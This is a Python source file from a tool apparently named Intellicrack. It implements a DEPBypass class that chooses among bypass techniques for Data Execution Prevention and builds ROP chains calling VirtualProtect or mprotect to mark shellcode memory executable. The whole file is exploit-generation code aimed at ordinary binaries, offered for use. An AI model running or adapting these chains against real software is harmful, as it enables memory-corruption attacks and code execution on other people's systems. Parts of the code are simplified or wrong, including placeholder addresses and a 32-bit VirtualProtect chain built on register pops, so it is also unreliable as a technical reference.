"""This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see https://www.gnu.org/licenses/.
"""

import logging
import struct
from typing import Any, Dict, List

from .bypass_base import ROPBasedBypass


class DEPBypass(ROPBasedBypass):
    """Data Execution Prevention bypass implementation."""

    def __init__(self):
        """Initialize the DEP bypass engine with ROP-based techniques."""
        super().__init__("DEP")
        self.logger = logging.getLogger(__name__)

    def _initialize_techniques(self) -> None:
        """Initialize DEP bypass techniques."""
        self.techniques = ["rop_chain", "jop_chain", "ret2libc", "heap_spray", "virtualprotect_rop", "mprotect_rop"]

    def get_recommended_technique(self, binary_info: Dict[str, Any]) -> str:
        """Get recommended DEP bypass technique based on binary analysis."""
        arch = binary_info.get("architecture", "unknown")
        has_gadgets = binary_info.get("gadget_count", 0) > 10
        imports = binary_info.get("imports", [])

        # Check for useful API functions
        dangerous_imports = binary_info.get("dangerous_imports", [])
        has_virtualprotect = any("VirtualProtect" in func for func in dangerous_imports)
        has_mprotect = any("mprotect" in func for func in dangerous_imports)

        if has_virtualprotect:
            return "virtualprotect_rop"
        elif has_mprotect:
            return "mprotect_rop"
        elif arch == "x86_64" and has_gadgets:
            return "rop_chain"
        elif imports:
            return "ret2libc"
        else:
            return "heap_spray"

    def analyze_dep_bypass(self, binary_info: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze DEP bypass opportunities."""
        try:
            recommended = self.get_recommended_technique(binary_info)
            confidence = self._calculate_confidence(binary_info, recommended)

            return {
                "success": True,
                "techniques_available": self.techniques,
                "recommended": recommended,
                "confidence": confidence,
                "binary_analysis": {
                    "architecture": binary_info.get("architecture", "unknown"),
                    "gadget_availability": binary_info.get("gadget_count", 0),
                    "import_functions": len(binary_info.get("imports", [])),
                    "has_dangerous_apis": bool(binary_info.get("dangerous_imports")),
                },
                "rop_analysis": self.assess_rop_viability(binary_info),
            }

        except Exception as e:
            self.logger.error(f"DEP bypass analysis failed: {e}")
            return {
                "success": False,
                "error": str(e),
                "techniques_available": self.techniques,
                "recommended": "rop_chain",
                "confidence": 0.0,
            }

    def generate_rop_chain(self, binary_info: Dict[str, Any], target: str = "virtualprotect") -> Dict[str, Any]:
        """Generate ROP chain for DEP bypass."""
        chain_info = {"chain": b"", "target": target, "success": False, "gadgets_used": [], "stack_layout": []}

        try:
            # Get ROP gadgets
            binary_data = binary_info.get("data", b"")
            if not binary_data:
                return chain_info

            gadgets = self.find_rop_gadgets(binary_info)
            if not gadgets:
                return chain_info

            # Build chain based on target
            if target == "virtualprotect":
                chain_info = self._build_virtualprotect_chain(gadgets, binary_info)
            elif target == "mprotect":
                chain_info = self._build_mprotect_chain(gadgets, binary_info)
            elif target == "generic":
                chain_info = self._build_generic_rop_chain(gadgets, binary_info)

            return chain_info

        except Exception as e:
            self.logger.error(f"ROP chain generation failed: {e}")
            return chain_info

    def _calculate_confidence(self, binary_info: Dict[str, Any], technique: str) -> float:
        """Calculate confidence level for bypass technique."""
        base_confidence = 0.5

        # Boost confidence based on available resources
        if technique == "virtualprotect_rop":
            if any("VirtualProtect" in str(imp) for imp in binary_info.get("dangerous_imports", [])):
                base_confidence += 0.3
        elif technique == "mprotect_rop":
            if any("mprotect" in str(imp) for imp in binary_info.get("dangerous_imports", [])):
                base_confidence += 0.3
        elif technique == "rop_chain":
            gadget_count = binary_info.get("gadget_count", 0)
            if gadget_count > 20:
                base_confidence += 0.3
            elif gadget_count > 10:
                base_confidence += 0.2
        elif technique == "ret2libc":
            if binary_info.get("imports"):
                base_confidence += 0.2

        return min(base_confidence, 1.0)

    def _build_virtualprotect_chain(self, gadgets: List[Dict[str, Any]], binary_info: Dict[str, Any]) -> Dict[str, Any]:
        """Build ROP chain for VirtualProtect call."""
        chain_info = {"chain": b"", "target": "virtualprotect", "success": False, "gadgets_used": [], "stack_layout": []}

        try:
            # VirtualProtect signature: BOOL VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD)
            # Need: target address, size, new protection (PAGE_EXECUTE_READWRITE), old protection ptr

            virtualprotect_addr = self._find_virtualprotect_address(binary_info)
            if not virtualprotect_addr:
                return chain_info

            # Find necessary gadgets
            pop_ecx = self._find_gadget_by_pattern(gadgets, "pop ecx")
            pop_edx = self._find_gadget_by_pattern(gadgets, "pop edx")
            pop_ebx = self._find_gadget_by_pattern(gadgets, "pop ebx")
            pop_eax = self._find_gadget_by_pattern(gadgets, "pop eax")

            if not all([pop_ecx, pop_edx, pop_ebx, pop_eax]):
                return chain_info

            # Build the chain
            chain = b""

            # Set up arguments (reverse order for stack)
            chain += struct.pack("<I", pop_eax["address"])  # pop eax; ret
            chain += struct.pack("<I", 0x41414141)  # shellcode location

            chain += struct.pack("<I", pop_ebx["address"])  # pop ebx; ret
            chain += struct.pack("<I", 0x1000)  # size

            chain += struct.pack("<I", pop_ecx["address"])  # pop ecx; ret
            chain += struct.pack("<I", 0x40)  # PAGE_EXECUTE_READWRITE

            chain += struct.pack("<I", pop_edx["address"])  # pop edx; ret
            chain += struct.pack("<I", 0x42424242)  # old protection ptr

            # Call VirtualProtect
            chain += struct.pack("<I", virtualprotect_addr)

            chain_info.update(
                {
                    "chain": chain,
                    "success": True,
                    "gadgets_used": [pop_eax, pop_ebx, pop_ecx, pop_edx],
                    "stack_layout": [
                        "pop eax (shellcode addr)",
                        "pop ebx (size)",
                        "pop ecx (new protection)",
                        "pop edx (old protection ptr)",
                        "VirtualProtect call",
                    ],
                }
            )

        except Exception as e:
            self.logger.error(f"VirtualProtect chain build failed: {e}")

        return chain_info

    def _build_mprotect_chain(self, gadgets: List[Dict[str, Any]], binary_info: Dict[str, Any]) -> Dict[str, Any]:
        """Build ROP chain for mprotect call."""
        chain_info = {"chain": b"", "target": "mprotect", "success": False, "gadgets_used": [], "stack_layout": []}

        try:
            # mprotect signature: int mprotect(void *addr, size_t len, int prot)
            mprotect_addr = self._find_mprotect_address(binary_info)
            if not mprotect_addr:
                return chain_info

            # Find gadgets for setting up registers
            pop_rdi = self._find_gadget_by_pattern(gadgets, "pop rdi")
            pop_rsi = self._find_gadget_by_pattern(gadgets, "pop rsi")
            pop_rdx = self._find_gadget_by_pattern(gadgets, "pop rdx")

            if not all([pop_rdi, pop_rsi, pop_rdx]):
                return chain_info

            # Build chain
            chain = b""

            # Set up arguments (System V x86-64 ABI)
            chain += struct.pack("<Q", pop_rdi["address"])  # pop rdi; ret
            chain += struct.pack("<Q", 0x4141414141414141)  # target address

            chain += struct.pack("<Q", pop_rsi["address"])  # pop rsi; ret
            chain += struct.pack("<Q", 0x1000)  # size

            chain += struct.pack("<Q", pop_rdx["address"])  # pop rdx; ret
            chain += struct.pack("<Q", 0x7)  # PROT_READ | PROT_WRITE | PROT_EXEC

            # Call mprotect
            chain += struct.pack("<Q", mprotect_addr)

            chain_info.update(
                {
                    "chain": chain,
                    "success": True,
                    "gadgets_used": [pop_rdi, pop_rsi, pop_rdx],
                    "stack_layout": ["pop rdi (target addr)", "pop rsi (size)", "pop rdx (protection)", "mprotect call"],
                }
            )

        except Exception as e:
            self.logger.error(f"mprotect chain build failed: {e}")

        return chain_info

    def _build_generic_rop_chain(self, gadgets: List[Dict[str, Any]], binary_info: Dict[str, Any]) -> Dict[str, Any]:
        """Build generic ROP chain for code execution."""
        chain_info = {"chain": b"", "target": "generic", "success": False, "gadgets_used": [], "stack_layout": []}

        try:
            # Simple chain to demonstrate ROP capability
            pop_eax = self._find_gadget_by_pattern(gadgets, "pop eax")
            pop_ebx = self._find_gadget_by_pattern(gadgets, "pop ebx")

            if pop_eax and pop_ebx:
                chain = b""
                chain += struct.pack("<I", pop_eax["address"])
                chain += struct.pack("<I", 0xDEADBEEF)  # test value
                chain += struct.pack("<I", pop_ebx["address"])
                chain += struct.pack("<I", 0xCAFEBABE)  # test value

                chain_info.update(
                    {
                        "chain": chain,
                        "success": True,
                        "gadgets_used": [pop_eax, pop_ebx],
                        "stack_layout": ["pop eax", "test value", "pop ebx", "test value"],
                    }
                )

        except Exception as e:
            self.logger.error(f"Generic ROP chain build failed: {e}")

        return chain_info

    def _find_virtualprotect_address(self, binary_info: Dict[str, Any]) -> int:
        """Find VirtualProtect function address."""
        imports = binary_info.get("imports", [])
        for imp in imports:
            if "VirtualProtect" in str(imp):
                return imp.get("address", 0)
        return 0

    def _find_mprotect_address(self, binary_info: Dict[str, Any]) -> int:
        """Find mprotect function address."""
        imports = binary_info.get("imports", [])
        for imp in imports:
            if "mprotect" in str(imp):
                return imp.get("address", 0)
        return 0

    def _find_gadget_by_pattern(self, gadgets: List[Dict[str, Any]], pattern: str) -> Dict[str, Any]:
        """Find gadget matching description pattern."""
        for gadget in gadgets:
            if pattern.lower() in gadget.get("description", "").lower():
                return gadget
        return None


__all__ = ["DEPBypass"]
